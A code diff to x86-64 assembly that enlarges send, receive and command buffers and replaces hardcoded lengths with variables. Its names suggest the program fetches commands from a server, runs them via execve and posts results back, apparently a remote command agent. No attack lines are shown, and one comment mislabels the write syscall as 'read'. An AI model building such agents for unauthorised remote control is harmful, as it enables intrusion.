@@ -25,15 +25,17 @@ section .data
     cmd_buffer_old_length dq 0x0            ; Length of the cmd_buffer_old
     tx_buffer_length dq 0x0                 ; Length of the tx_buffer
     status_data dq 0x0                      ; Status of wait4 syscall
+    rx_buffer_max_len dq 0x1000             ; Maximum rx buffer length to avoid hardcoding
+    tx_buffer_max_len dq 0x1000             ; Maximum tx buffer length to avoid hardcoding
 
 section .bss
-    rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
-    tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
-    cmd_buffer resb 0x100                   ; Buffer for received command
-    cmd_buffer_old resb 0x100               ; Buffer to store last command
+    rx_buffer resb 0x1000                   ; Receiving buffer from the server
+    tx_buffer resb 0x1000                   ; Transmitting buffer to the server
+    cmd_buffer resb 0x1000                  ; Buffer for received command
+    cmd_buffer_old resb 0x1000              ; Buffer to store last command
     argv resq 0x4                           ; Argument values for execve call
     pipe_fd resd 0x2                        ; pipe file descriptors for IPC
-    ascii_post_cl_number resb 0x15          ; ASCII content length for POST, 64 bit number
+    ascii_post_cl_number resb 0x15          ; ASCII content length for POST
     ascii_post_cl_decimal_cnt resb 1        ; To store the number of decimal digits
 
 section .text
@@ -173,10 +175,10 @@ fn_dbg_print_rx_buffer:
     sub rsp, 0x8                ; Stackframe
 
     ; Write buffer to STDOUT
-    mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; STDOUT file descriptor
-    lea rsi, [rx_buffer]        ; pointer to the buffer
-    mov rdx, 0x400              ; buffer size
+    mov rax, 0x1                    ; read syscall
+    mov rdi, 0x1                    ; STDOUT file descriptor
+    lea rsi, [rx_buffer]            ; pointer to the buffer
+    mov rdx, [rx_buffer_max_len]    ; buffer size
     syscall
 
     cmp rax, 0
@@ -193,10 +195,10 @@ fn_dbg_print_tx_buffer:
     sub rsp, 0x8                ; Stackframe
 
     ; Write buffer to STDOUT
-    mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; STDOUT file descriptor
-    lea rsi, [tx_buffer]        ; pointer to the buffer
-    mov rdx, 0x400              ; buffer size
+    mov rax, 0x1                    ; read syscall
+    mov rdi, 0x1                    ; STDOUT file descriptor
+    lea rsi, [tx_buffer]            ; pointer to the buffer
+    mov rdx, [tx_buffer_max_len]    ; buffer size
     syscall
 
     cmp rax, 0
@@ -707,7 +709,7 @@ fn_get_command:
 
     ; Clean rx_buffer after use
     lea rdi, [rx_buffer]
-    mov rsi, 0x400
+    mov rsi, [rx_buffer_max_len]
     call fn_clean_buffer
 
     mov rsp, rbp
